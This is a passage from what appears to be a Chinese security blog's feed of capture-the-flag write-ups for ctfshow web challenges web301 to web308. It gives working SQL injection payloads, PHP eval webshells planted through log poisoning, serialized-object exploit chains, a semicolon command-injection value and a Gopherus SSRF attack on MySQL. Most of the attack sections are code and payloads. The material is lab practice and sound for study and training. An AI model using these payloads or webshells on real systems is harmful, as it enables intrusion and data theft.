invoke__">preg_match</span>(<span class="string">&#x27;/\:/&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示phpinfo, 访问<code>phpinfo.php</code>, 发现可以包含</p><p>过滤冒号, 那就用剩下的包含方式: 日志包含, 利用session.upload_progress文件包含</p><p>就用日志包含了:</p><p>wappalyzer查看架构, 发现是Nginx服务器, 默认日志文件为<code>/var/log/nginx/access.log</code>, 尝试访问<code>/?f=/var/log/nginx/access.log</code>, 发现是可以访问的</p><p>在UA头中写入一句话木马, 然后交给蚁剑</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010182803263.png" alt="image-20241010182803263"></p><p>最后在根目录下的fl6g得到flag</p><p>所以也可以直接POST传入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;cat /fl6g&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web315"><a class="header-anchor" href="#web315">¶</a>web315</h2><ul><li>描述: debug开启，端口9000</li></ul><p><a href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce">github_漏洞介绍</a></p><p>那就是纯纯的脚本小子, 这里面也有相关使用方法, 我不多赘述</p><p>再贴一个看不太懂的文章: <a href="https://blog.csdn.net/weixin_33277215/article/details/116468944">https://blog.csdn.net/weixin_33277215/article/details/116468944</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> PHP伪协议 </tag>
            
            <tag> CVE </tag>
            
            <tag> CGI </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_代码审计</title>
      <link href="/article/ctfshow-webbasic-codeaudit/"/>
      <url>/article/ctfshow-webbasic-codeaudit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>代码审计</h1><h2 id="web301"><a class="header-anchor" href="#web301">¶</a>web301</h2><ul><li>描述: 审计审计我三年前写的代码</li></ul><p><code>checklogin.php</code>中存在sql注入:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>而且结合查看<code>logout.php</code>, 发现鉴权方式只有login是否为1, 可能有未授权</p><p>所以sql登录方式如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">userid=1&#x27;union select 1#&amp;userpwd=1</span><br><span class="line"></span><br><span class="line">userid=-1&#x27; union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;#&amp;userpwd=1</span><br></pre></td></tr></table></figure><p>未授权: 将cookie改成<code>login=1</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922104458895.png" alt="image-20240922104458895"></p><h2 id="web302"><a class="header-anchor" href="#web302">¶</a>web302</h2><p>描述: <code>if(!strcasecmp(sds_decode($userpwd),$row['sds_password']))&#123;</code></p><p>未授权没了</p><p>全局搜索sds_decode, 在<code>fun.php</code>中找到解密函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为什么我检查<code>checklogin.php</code>依然没变下面这个, 不过无所谓了, 就用上面那个</p><p>利用下面的代码进行本地运行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sds_decode</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># d9c77c4e454869d5d8da3b4be79694d3</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userid=1&#x27;union select &#x27;d9c77c4e454869d5d8da3b4be79694d3&#x27;#&amp;userpwd=1</span><br></pre></td></tr></table></figure><h2 id="web303"><a class="header-anchor" href="#web303">¶</a>web303</h2><p><code>checklogin.php</code>增加了限制:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sds_user.sql</code>给出账号admin和加密后密码, 试出来账号密码都是admin. 但是没给flag</p><p>回到代码审计, 在dpt.php中找到注释: <code>//注入点</code>, 发现<code>dptadd.php</code>中也有</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dpt.php, 没有可控参数, 压根就是假的</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//注入点</span></span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">    <span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select * from sds_dpt order by id;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922115507261.png" alt="image-20240922115507261"></p><p><code>die(mysqli_error($mysqli));</code>长期速逝导致的报错注入, 以及插入查询</p><p>刚好我们已经登录了, 记得登录后添加数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line"># 查当前数据库: sds</span><br><span class="line">dpt_name=-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),3)#</span><br><span class="line"># 查数据库表: sds_dpt,sds_fl9g,sds_user</span><br><span class="line">dpt_name=-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(table_name)from information_schema.tables where table_schema = database()), 1 , 31)),3)#</span><br><span class="line"># 查表内字段: flag</span><br><span class="line">dpt_name=-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(column_name)from information_schema.columns where table_name = &#x27;sds_fl9g&#x27;), 1 , 31)),3)#</span><br><span class="line"># 获取表内信息: ctfshow&#123;d04dd568-5e60-43b3-8298-5304f1c332f1&#125;</span><br><span class="line">dpt_name=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,substr((select flag from sds_fl9g),1,31)),3)#</span><br><span class="line">dpt_name=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,substr((select flag from sds_fl9g),31,50)),3)#</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922181423719.png" alt="image-20240922181423719"></p><p>再来看看insert注入, 然后刷新就能在浏览器里面看到结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表</span><br><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br><span class="line"># 查字段</span><br><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_fl9g&#x27;);#</span><br><span class="line"># 查数据</span><br><span class="line">dpt_name=1&#x27;,sds_address=(select flag from sds_fl9g)#</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922181932570.png" alt="image-20240922181932570"></p><h2 id="web304"><a class="header-anchor" href="#web304">¶</a>web304</h2><ul><li>描述: 增加了全局waf</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反正源码还是上一题的, 甚至上一题的两个方法也能用, 懒得写了</p><h2 id="web305"><a class="header-anchor" href="#web305">¶</a>web305</h2><ul><li>描述: 代码地址</li></ul><p>这次是真过滤了, 新增在<code>fun.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\&quot;|\,|\.|\?|\/|\\\|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增了<code>class.php</code>, 似乎是一个反序列化:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看谁引用了这个文件, 发现是<code>checklogin.php</code>中有反序列化操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user_cookie</span>))&#123;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就很简单了, 构造反序列化然后通过cookie传入即可, exp如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922194816615.png" alt="image-20240922194816615"></p><p>然后访问<code>1.php</code>执行命令即可</p><p>flag在数据库中, 可以利用蚁剑的数据库操作:</p><p>首页右键连接成功的条目, 选择数据操作</p><p>先检测数据库函数支持(本题为Mysqli), 然后配置连接, 密码在<code>conn.php</code>中, 执行查询语句即可</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922200152501.png" alt="image-20240922200152501"></p><h2 id="web306"><a class="header-anchor" href="#web306">¶</a>web306</h2><ul><li>描述: 开始使用mvc结构</li></ul><p>在<code>index.php</code>有一个反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;dao.php&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>conn.php</code>是连接mysql数据库用的, 没内容</p><p><code>dao.php</code>引入<code>class.php</code>, 该文件中有<code>file_put_contents()</code>, 可以用于写文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginfo</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;info=<span class="variable language_">$this</span>-&gt;info.<span class="variable">$info</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;title, <span class="variable">$this</span>-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以通过<code>dao.php</code>触发写文件操作, 而index.php刚好引入了<code>dao.php</code>, 反序列化链如下</p><blockquote><p>index -&gt; dao::__destruct() -&gt; log::close()</p></blockquote><p>写payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$conn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn=<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>(<span class="keyword">new</span> <span class="title function_ invoke__">log</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="comment">//# TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</span></span><br></pre></td></tr></table></figure><p>利用hackbar直接对<code>index.php</code>发包并设置cookie的user值为上面的输出</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241007215401537.png" alt="image-20241007215401537"></p><p>然后在当前目录下找到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web307"><a class="header-anchor" href="#web307">¶</a>web307</h2><ul><li>描述: 是不是顺眼多了</li></ul><p>现在反序列化的入口出现在了<code>cotroller/logout.php</code>, 而且没有身份认证</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 省略一些东西</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;service/service.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable">$service</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;service&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$service</span>)&#123;</span><br><span class="line"><span class="variable">$service</span>-&gt;<span class="title function_ invoke__">clearCache</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查询该函数, 发现在<code>cotroller/service/dao/dao.php</code>中存在, 而且该函数直接调用的shell_exec</p><p>在参数可控的情况下, 可以利用分号阻断前面命令, 执行我们的命令</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();    <span class="comment"># 接下, 那就只能去config.php了</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">        </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf ./&#x27;</span>.<span class="variable">$this</span>-&gt;config-&gt;cache_dir.<span class="string">&#x27;/*&#x27;</span>);    <span class="comment"># 明显是删掉这个路径, 这个路径不在class.php</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cotroller/service/dao/config/config.php</code>中有路径设置:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$mysql_username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$mysql_password</span>=<span class="string">&#x27;phpcj&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$mysql_db</span>=<span class="string">&#x27;sds&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$mysql_port</span>=<span class="number">3306</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$mysql_host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;cache&#x27;</span>;</span><br><span class="line">        <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么利用链就出来了</p><blockquote><p>logout -&gt; config -&gt;  dao::clearCache()</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;; echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php; &#x27;</span> ;  这里需要转义$符</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjsgZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTs/PiIgPiAxLnBocDsgIjt9fQ==</span></span><br></pre></td></tr></table></figure><p>注意生成的文件在<code>/controller/1.php</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241007224857190.png" alt="image-20241007224857190"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">1=system(&#x27;tac ../flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web308"><a class="header-anchor" href="#web308">¶</a>web308</h2><ul><li>描述: 需要拿shell</li></ul><p>之前的<code>cache_dir</code>添加了正则过滤, 只允许字母通过, 看起来是不能利用了</p><p>在<code>index.php</code>中有反序列化入口</p><blockquote><p>我的建议是直接全局搜索 unserialize, 排查可以访问到的文件</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$service</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;service&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$service</span>)&#123;</span><br><span class="line">    <span class="variable">$lastVersion</span>=<span class="variable">$service</span>-&gt;<span class="title function_ invoke__">checkVersion</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再找这个方法来自哪里, 来自<code>dao.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">checkUpdate</span>(<span class="variable">$this</span>-&gt;config-&gt;update_url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再找checkUpdate, 来自<code>fun.php</code>, 这里存在ssrf:</p><ul><li>传入的url没有经过任何过滤</li><li><code>CURLOPT_SSL_VERIFYPEER</code>设置为<code>false</code>禁用了对SSL证书颁发机构的验证</li><li><code>CURLOPT_SSL_VERIFYHOST</code>设置为<code>false</code>禁用了对主机名的验证</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUpdate</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>index -&gt; dao::checkVersion() -&gt; fun::checkUpdate</p></blockquote><p>这里写不了马, 那就看看数据库能不能利用: 找到config.php文件, 发现没有密码</p><p>利用gopher协议和mysql数据库攻击, 现成的工具(必须没有密码): <a href="https://github.com/tarunkant/Gopherus">Gopherus</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit mysql</span><br><span class="line">root</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?=eval($_POST[1])?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008220507854.png" alt="image-20241008220507854"></p><p>然后利用反序列化链即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span 